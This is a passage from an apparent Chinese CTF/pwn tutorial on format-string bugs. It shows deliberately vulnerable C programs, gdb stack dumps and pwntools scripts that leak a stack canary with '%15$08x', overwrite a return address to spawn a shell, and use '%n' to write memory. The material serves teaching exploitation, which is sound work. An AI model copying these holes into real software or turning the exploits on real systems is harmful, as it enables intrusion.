    +------------------+
    |        ebp       |
    +------------------+
    |    return addr   |
    +------------------+
在ebp之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测canary是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖canary，这时程序会直接退出。绕过canary肯定需要知道canary的值，但是这个值是无法预测的，所以我们需要通过内存泄漏来泄漏出canary的值。下面我们给出一个示例程序：
    #include
    void exploit()
    {
        system("/bin/sh");
    }
    void func()
    {
        char str[0x20];
        read(0, str, 0x50);
        printf(str);
        read(0, str, 0x50);
    }
    int main()
    {
        func();
        return 0;
    }
编译方式：
    gcc -m32 -O0 vuln.c -o vuln
然后，我们使用gdb中的checksec看一下程序开启的保护：
    gdb-peda$ checksec 
    CANARY    : ENABLED
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : Partial
此时，我们需要调试程序，让程序断在printf。查找canary距离printf第一个参数有多远，函数断在printf后栈中数据如下：
    [-------------------------------------code-------------------------------------]
    0x80485a8 :    call   0x8048410 
    0x80485ad :    lea    eax,[ebp-0x2c]
    0x80485b0 :    mov    DWORD PTR [esp],eax
    => 0x80485b3 :    call   0x8048420 
    0x80485b8 :    mov    DWORD PTR [esp+0x8],0x50
    0x80485c0 :    lea    eax,[ebp-0x2c]
    0x80485c3 :    mov    DWORD PTR [esp+0x4],eax
    0x80485c7 :    mov    DWORD PTR [esp],0x0
    Guessed arguments:
    arg[0]: 0xffffcf6c ("aaaan")
    [------------------------------------stack-------------------------------------]
    0000| 0xffffcf50 --> 0xffffcf6c ("aaaan")
    0004| 0xffffcf54 --> 0xffffcf6c ("aaaan")
    0008| 0xffffcf58 --> 0x20 (' ')
    0012| 0xffffcf5c --> 0xf7eac716 (test   eax,eax)
    0016| 0xffffcf60 --> 0xffffffff 
    0020| 0xffffcf64 --> 0xf7e24b34 --> 0x2910 
    0024| 0xffffcf68 --> 0xf7e24c34 --> 0x2aad 
    0028| 0xffffcf6c ("aaaan")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x080485b3 in func ()
    gdb-peda$ x/20wx 0xffffcf50
    0xffffcf50:    0xffffcf6c    0xffffcf6c    0x00000020    0xf7eac716
    0xffffcf60:    0xffffffff    0xf7e24b34    0xf7e24c34    0x61616161
    0xffffcf70:    0x0000000a    0x00000000    0xffffcfb8    0xf7e7f0df
    0xffffcf80:    0xf7fbf960    0x00000000    0x00002000    0xe920f900
    0xffffcf90:    0xf7fbfc20    0xf7ffd938    0xffffcfb8    0x08048633
根据canary的特点，我们判断0xe920f900为canary，地址是0xffffcf8c。距离第一个参数有60字节，也就是15个参数的长度，所以要读canary我们的payload为%15x。经过分析，我们的exploit如下，先通过格式化字符串漏洞泄漏canary，再完成利用：
    from pwn import *
    elf = ELF("./vuln")
    io = process("./vuln")
    shell_addr = elf.symbols["exploit"]
    payload = "%15$08x"
    io.sendline(payload)
    ret = io.recv()
    canary = ret[:8]
    log.success("canary => 0x{}".format(canary))
    payload = "a" * 4 * 8
    payload += (canary.decode("hex"))[::-1] # 小端模式反转
    payload += "a" * 4 * 3
    payload += p32(shell_addr)
    io.send(payload)
    io.interactive()
**2.利用格式化字符串漏洞完成内存写**
我们给出一个示例程序：
    #include
    #include
    #include
    void exploit()
    {
        system("/bin/sh");
    }
    int func()
    {
        int *flag;
        char *cmp = "y";
        char name[20] = {0};
        flag = (char *)malloc(4);
        memset(flag, 0, 4);
        memcpy(flag, "n", 1);
        scanf("%s", name);
        printf(name);
        if(!strcmp(flag, cmp))
        {
            exploit();
        }
        return 1;
    }
    int main()
    {
        func();
        return 0;
    }
可以看出，当flag的内容为y时，才能执行system("/bin/sh")，然而，flag的值总为n。这时候就需要用格式化字符串漏洞来写内存了。因为y的ascii码对应的10进制数为121，所以要打印121个字符，最终我们的exploit如下：
    from pwn import *
    io = process("./vuln")
    elf = ELF("./vuln")
    shell_addr = elf.symbols["exploit"]  
    payload = "%0121x%5$n"   
    io.sendline(payload)   
    io.interactive()
最后，如果是64bit的程序，需要泄漏canary的情况下。因为x86_64的canary为8字节，所以需要两次泄漏（误），其实使用%lx就可以啦。
**0x04 参考文献**
**传送门**
* * *
[**【技术分享】跟我入坑PWN第一章** ****](http://bobao.360.cn/learning/detail/3300.html)